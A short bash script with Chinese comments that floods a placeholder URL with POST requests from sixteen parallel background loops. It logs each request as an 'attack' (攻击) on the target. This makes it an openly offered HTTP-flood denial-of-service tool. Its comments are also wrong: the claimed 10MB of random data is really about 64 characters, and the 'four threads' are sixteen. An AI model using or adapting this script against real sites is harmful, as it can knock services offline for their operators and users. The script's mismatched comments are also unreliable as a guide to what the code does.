#!/bin/bash

# 直接在脚本中定义URL和重复次数
URL="<URL>"
REPEAT_COUNT=<CS>

# 获取当前工作目录
SCRIPT_DIR=$(pwd)

# 创建临时文件并生成10MB的伪随机数据
TEMP_FILE="${SCRIPT_DIR}/random_data.tmp"
echo $(date +%s%N | sha256sum | tr -d ' -') | fold -w1 | shuf | tr -d '\n' | head -c10000000 > "$TEMP_FILE"

# 定义一个函数来执行请求任务
perform_requests() {
    local thread_id=$1
    for ((i=1; i<=$REPEAT_COUNT; i++)); do
        # 使用curl发送POST请求，并将响应内容写入文件
        RESPONSE_FILE="${SCRIPT_DIR}/response_${thread_id}_${i}.txt"
        curl -s -X POST -H "Content-Type: application/octet-stream" --data-binary @"$TEMP_FILE" $URL > "$RESPONSE_FILE"
        
        # 显示请求次数
        echo "线程${thread_id} 攻击：${URL} 了${i}次"
        
        # 删除响应文件
        rm "$RESPONSE_FILE"
        
        # 可选：添加延迟以避免过于频繁的请求
        # sleep 1
    done
}

# 启动四个线程同时执行请求任务
perform_requests 01 &
perform_requests 02 &
perform_requests 03 &
perform_requests 04 &
perform_requests 05 &
perform_requests 06 &
perform_requests 07 &
perform_requests 08 &
perform_requests 09 &
perform_requests 10 &
perform_requests 11 &
perform_requests 12 &
perform_requests 13 &
perform_requests 14 &
perform_requests 15 &
perform_requests 16 &
# 等待所有后台任务完成
wait

# 删除临时文件
rm "$TEMP_FILE"